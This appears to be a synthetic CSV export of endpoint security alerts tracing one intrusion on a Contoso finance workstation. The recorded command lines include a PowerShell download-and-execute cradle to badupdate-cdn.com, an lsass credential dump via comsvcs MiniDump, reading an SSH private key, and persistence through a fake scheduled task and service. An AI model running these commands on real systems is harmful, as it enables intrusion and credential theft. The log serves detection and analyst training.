TimeGenerated,DeviceName,DeviceId,ActionType,FileName,FolderPath,SHA1,AccountName,AccountDomain,AccountSid,InitiatingProcessAccountName,InitiatingProcessAccountUpn,InitiatingProcessFileName,InitiatingProcessCommandLine,InitiatingProcessParentFileName,RemoteUrl,AdditionalFields,ReportId
2026-06-10T08:34:51Z,HR-WS-03,e7e7e7e7-3333-4444-5555-000000000003,PnpDeviceConnected,,,,meganb,CONTOSO,S-1-5-21-1004336348-1177238915-682003330-3501,meganb,meganb@contoso.com,svchost.exe,svchost.exe -k UnistackSvcGroup,services.exe,,"{""DeviceDescription"":""SanDisk Ultra USB 3.0"",""ClassName"":""DiskDrive"",""DeviceId"":""USBSTOR\\DISK&VEN_SANDISK""}",4102301
2026-06-10T08:35:22Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,AsrOfficeChildProcessAudited,WINWORD.EXE,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,a3f5c1e9d2b7048e6f1a9c3b5d7e0f2a4c6b8d10,alexw,CONTOSO,S-1-5-21-1004336348-1177238915-682003330-2071,alexw,alexw@contoso.com,WINWORD.EXE,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"" /n ""C:\Users\alexw\Downloads\Invoice_Q2_Remittance.docm""",explorer.exe,,"{""RuleId"":""d4f940ab-401b-4efc-aadc-ad5f3c50688a"",""RuleName"":""Block all Office applications from creating child processes"",""IsAudit"":true}",4102544
2026-06-10T08:35:24Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,AsrOfficeChildProcessBlocked,cmd.exe,C:\Windows\System32\cmd.exe,9a74f8b21cce6f0d4a2e8b3c5d7f1029e4b6a8c0,alexw,CONTOSO,S-1-5-21-1004336348-1177238915-682003330-2071,alexw,alexw@contoso.com,WINWORD.EXE,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE""",explorer.exe,,"{""RuleId"":""d4f940ab-401b-4efc-aadc-ad5f3c50688a"",""RuleName"":""Block all Office applications from creating child processes"",""IsAudit"":false,""ChildProcess"":""cmd.exe""}",4102561
2026-06-10T08:36:09Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,PowerShellCommand,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,b1d2e3f405162738495a6b7c8d9e0f1122334455,alexw,CONTOSO,S-1-5-21-1004336348-1177238915-682003330-2071,alexw,alexw@contoso.com,powershell.exe,"powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnAA==",cmd.exe,,"{""Command"":""IEX (New-Object Net.WebClient).DownloadString"",""Encoded"":true}",4102588
2026-06-10T08:36:11Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,AntivirusDetection,amsi_script_4471.ps1,C:\Users\alexw\AppData\Local\Temp\amsi_script_4471.ps1,c2e4a6081a3b5d7f9e1c3a5b7d9f1e3a5c7b9d11,alexw,CONTOSO,S-1-5-21-1004336348-1177238915-682003330-2071,alexw,alexw@contoso.com,powershell.exe,"powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnAA==",cmd.exe,,"{""ThreatName"":""Trojan:PowerShell/Cobal_Amsi.A"",""DetectionSource"":""AMSI"",""Severity"":""High"",""WasRemediated"":false}",4102590
2026-06-10T08:38:47Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,AmsiUacScanResult,,,,alexw,CONTOSO,S-1-5-21-1004336348-1177238915-682003330-2071,alexw,alexw@contoso.com,powershell.exe,"powershell.exe -nop -w hidden -c IEX(IWR http://badupdate-cdn.com/u.ps1 -UseBasicParsing)",cmd.exe,badupdate-cdn.com,"{""ScanResult"":""Detected"",""ContentName"":""IWR badupdate-cdn.com""}",4102655
2026-06-10T08:41:03Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,AsrUntrustedExecutableBlocked,update.hta,C:\Users\alexw\AppData\Local\Temp\update.hta,d3f5a70921b4c6e8f0a2c4b6d8e0f2a4c6b8d012,alexw,CONTOSO,S-1-5-21-1004336348-1177238915-682003330-2071,alexw,alexw@contoso.com,mshta.exe,"""C:\Windows\System32\mshta.exe"" C:\Users\alexw\AppData\Local\Temp\update.hta",cmd.exe,,"{""RuleId"":""01443614-cd74-433a-b99e-2ecdc07bfc25"",""RuleName"":""Block executable files from running unless they meet a prevalence, age, or trusted list criterion"",""IsAudit"":false}",4102702
2026-06-10T08:41:05Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,ProcessCreatedUsingWmiQuery,mshta.exe,C:\Windows\System32\mshta.exe,e4a6b8021c3d5f7901b3d5f7a9c1e3b5d7f9a113,alexw,CONTOSO,S-1-5-21-1004336348-1177238915-682003330-2071,alexw,alexw@contoso.com,mshta.exe,"mshta.exe vbscript:CreateObject(""Wscript.Shell"").Run(""powershell -nop -w hidden -enc ...""):close",wmiprvse.exe,,"{""LolBin"":""mshta.exe"",""Technique"":""T1218.005""}",4102708
2026-06-10T08:42:30Z,HR-WS-03,e7e7e7e7-3333-4444-5555-000000000003,ControlFolderAccessAudited,backup_tool.exe,C:\Program Files\Acme Backup\backup_tool.exe,f5b7c9031d4e6a8012c4e6a8b0d2f4c6e8a0b214,meganb,CONTOSO,S-1-5-21-1004336348-1177238915-682003330-3501,meganb,meganb@contoso.com,backup_tool.exe,"""C:\Program Files\Acme Backup\backup_tool.exe"" --scan ""C:\Users\meganb\Documents""",services.exe,,"{""ProtectedFolder"":""C:\\Users\\meganb\\Documents"",""IsAudit"":true}",4102745
2026-06-10T08:44:18Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,NtAllocateVirtualMemoryRemoteApiCall,rundll32.exe,C:\Windows\System32\rundll32.exe,a6b8c0142e5f7a9013d5e7a9b1c3f5d7e9a1b315,alexw,CONTOSO,S-1-5-21-1004336348-1177238915-682003330-2071,alexw,alexw@contoso.com,rundll32.exe,"rundll32.exe C:\Users\alexw\AppData\Local\Temp\beacon.dll,Start",mshta.exe,,"{""LolBin"":""rundll32.exe"",""TargetProcess"":""explorer.exe"",""Technique"":""T1055""}",4102801
2026-06-10T08:47:52Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,ExploitGuardNonMicrosoftSignedBlocked,beacon.dll,C:\Users\alexw\AppData\Local\Temp\beacon.dll,b7c9d1253f6a8b0124e6f8a0c2d4f6e8a0b2c416,alexw,CONTOSO,S-1-5-21-1004336348-1177238915-682003330-2071,alexw,alexw@contoso.com,rundll32.exe,"rundll32.exe C:\Users\alexw\AppData\Local\Temp\beacon.dll,Start",mshta.exe,,"{""Feature"":""ExploitGuard"",""Mitigation"":""BlockNonMicrosoftSignedBinaries"",""ImageName"":""beacon.dll""}",4102844
2026-06-10T08:50:11Z,HR-WS-03,e7e7e7e7-3333-4444-5555-000000000003,SmartScreenUrlWarning,,,,jamest,CONTOSO,S-1-5-21-1004336348-1177238915-682003330-3702,jamest,jamest@contoso.com,msedge.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe""",explorer.exe,http://download.freeware-tools.io/setup.exe,"{""Experience"":""CustomBlockList"",""Decision"":""Warn"",""Url"":""download.freeware-tools.io""}",4102901
2026-06-10T08:53:39Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,AsrPsexecWmiChildProcessAudited,wmic.exe,C:\Windows\System32\wbem\wmic.exe,c8d0e2364a7b9c0235f7a9b1d3e5f7a9b1c3d517,alexw,CONTOSO,S-1-5-21-1004336348-1177238915-682003330-2071,alexw,alexw@contoso.com,wmic.exe,"wmic.exe /node:DC01 process call create ""cmd.exe /c whoami""",cmd.exe,,"{""RuleId"":""d1e49aac-8f56-4280-b9ba-993a6d77406c"",""RuleName"":""Block process creations originating from PSExec and WMI commands"",""IsAudit"":true}",4102955
2026-06-10T08:55:02Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,SensitiveFileRead,id_rsa,C:\Users\alexw\.ssh\id_rsa,d9e1f3475b8c0d1346a8b0c2e4f6a8b0c2d4e618,alexw,CONTOSO,S-1-5-21-1004336348-1177238915-682003330-2071,alexw,alexw@contoso.com,powershell.exe,"powershell.exe Get-Content C:\Users\alexw\.ssh\id_rsa",rundll32.exe,,"{""SensitivityLabel"":""Credential"",""FileType"":""PrivateKey""}",4103002
2026-06-10T09:00:14Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,ScheduledTaskCreated,schtasks.exe,C:\Windows\System32\schtasks.exe,e0f2a4586c9d1e2457b9c1d3f5a7b9c1d3e5f719,alexw,CONTOSO,S-1-5-21-1004336348-1177238915-682003330-2071,alexw,alexw@contoso.com,schtasks.exe,"schtasks.exe /create /sc minute /mo 30 /tn ""MicrosoftEdgeUpdateTaskCore"" /tr ""rundll32 C:\Users\alexw\AppData\Local\Temp\beacon.dll,Start"" /f",cmd.exe,,"{""TaskName"":""MicrosoftEdgeUpdateTaskCore"",""Trigger"":""SCHEDULE_MINUTE"",""Technique"":""T1053.005""}",4103088
2026-06-10T09:02:47Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,ServiceInstalled,sc.exe,C:\Windows\System32\sc.exe,f1a3b5697d0e2f3568c0d2e4a6b8c0d2e4f6a820,alexw,CONTOSO,S-1-5-21-1004336348-1177238915-682003330-2071,alexw,alexw@contoso.com,sc.exe,"sc.exe create WinDefendSvc binPath= ""C:\Users\alexw\AppData\Local\Temp\svc.exe"" start= auto",cmd.exe,,"{""ServiceName"":""WinDefendSvc"",""StartType"":""auto"",""ImagePath"":""C:\\Users\\alexw\\AppData\\Local\\Temp\\svc.exe""}",4103140
2026-06-10T09:05:33Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,AsrLsassCredentialTheftBlocked,lsass.exe,C:\Windows\System32\lsass.exe,a2b4c6708e1f3a4679d1e3f5b7c9d1e3f5a7b921,alexw,CONTOSO,S-1-5-21-1004336348-1177238915-682003330-2071,alexw,alexw@contoso.com,rundll32.exe,"rundll32.exe C:\Windows\System32\comsvcs.dll,MiniDump 712 C:\Users\alexw\AppData\Local\Temp\lsass.dmp full",mshta.exe,,"{""RuleId"":""9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2"",""RuleName"":""Block credential stealing from the Windows local security authority subsystem (lsass.exe)"",""IsAudit"":false}",4103205
2026-06-10T09:08:19Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,AntivirusDetection,svc.exe,C:\Users\alexw\AppData\Local\Temp\svc.exe,b3c5d7819f2a4b578ae2f4a6c8d0e2f4a6b8c022,alexw,CONTOSO,S-1-5-21-1004336348-1177238915-682003330-2071,alexw,alexw@contoso.com,sc.exe,"sc.exe create WinDefendSvc binPath= ""C:\Users\alexw\AppData\Local\Temp\svc.exe"" start= auto",cmd.exe,,"{""ThreatName"":""Backdoor:Win32/CobaltStrike.B"",""DetectionSource"":""Antivirus"",""Severity"":""Severe"",""WasRemediated"":true}",4103260
2026-06-10T09:11:40Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,FirewallOutboundConnectionBlocked,beacon.dll,C:\Users\alexw\AppData\Local\Temp\beacon.dll,c4d6e8920a3b5c689bf3a5b7d9e1f3a5b7c9d123,alexw,CONTOSO,S-1-5-21-1004336348-1177238915-682003330-2071,alexw,alexw@contoso.com,rundll32.exe,"rundll32.exe C:\Users\alexw\AppData\Local\Temp\beacon.dll,Start",mshta.exe,badupdate-cdn.com,"{""RemoteIP"":""185.220.101.2"",""RemotePort"":443,""Direction"":""Out"",""RemoteUrl"":""badupdate-cdn.com""}",4103318
2026-06-10T09:13:05Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,UserAccountAddedToLocalGroup,net.exe,C:\Windows\System32\net.exe,d5e7f9031b4c6d790ca4b6c8e0f2a4b6c8d0e224,alexw,CONTOSO,S-1-5-21-1004336348-1177238915-682003330-2071,alexw,alexw@contoso.com,net.exe,"net.exe localgroup administrators alexw /add",cmd.exe,,"{""GroupName"":""Administrators"",""AddedMember"":""CONTOSO\\alexw"",""Technique"":""T1098""}",4103377
2026-06-10T09:14:48Z,HR-WS-03,e7e7e7e7-3333-4444-5555-000000000003,AntivirusScanCompleted,,,,meganb,CONTOSO,S-1-5-21-1004336348-1177238915-682003330-3501,System,,MsMpEng.exe,"""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2404.6-0\MsMpEng.exe""",services.exe,,"{""ScanType"":""QuickScan"",""ThreatsFound"":0,""Result"":""Completed""}",4103401
2026-06-10T09:15:22Z,FIN-WS-07,d1d1d1d1-aaaa-bbbb-cccc-000000000007,PnpDeviceConnected,,,,alexw,CONTOSO,S-1-5-21-1004336348-1177238915-682003330-2071,alexw,alexw@contoso.com,explorer.exe,explorer.exe,winlogon.exe,,"{""DeviceDescription"":""Kingston DataTraveler 3.0"",""ClassName"":""DiskDrive"",""DeviceId"":""USBSTOR\\DISK&VEN_KINGSTON""}",4103455
2026-06-10T08:31:07Z,HR-WS-03,e7e7e7e7-3333-4444-5555-000000000003,ExploitGuardSmartScreenBlocked,,,,jamest,CONTOSO,S-1-5-21-1004336348-1177238915-682003330-3702,jamest,jamest@contoso.com,msedge.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe""",explorer.exe,http://login-contoso-sso.com/portal,"{""Experience"":""Phishing"",""Decision"":""Blocked"",""Url"":""login-contoso-sso.com""}",4102188
2026-06-10T08:58:26Z,DC01,c0c0c0c0-2222-3333-4444-000000000001,AsrPsexecWmiChildProcessBlocked,cmd.exe,C:\Windows\System32\cmd.exe,e6f8a0142c5d7e891bd3f5a7c9e1f3a5c7d9e025,alexw,CONTOSO,S-1-5-21-1004336348-1177238915-682003330-2071,alexw,alexw@contoso.com,WmiPrvSE.exe,"cmd.exe /c whoami",WmiPrvSE.exe,FIN-WS-07,"{""RuleId"":""d1e49aac-8f56-4280-b9ba-993a6d77406c"",""RuleName"":""Block process creations originating from PSExec and WMI commands"",""IsAudit"":false,""RemoteDevice"":""FIN-WS-07""}",4103044
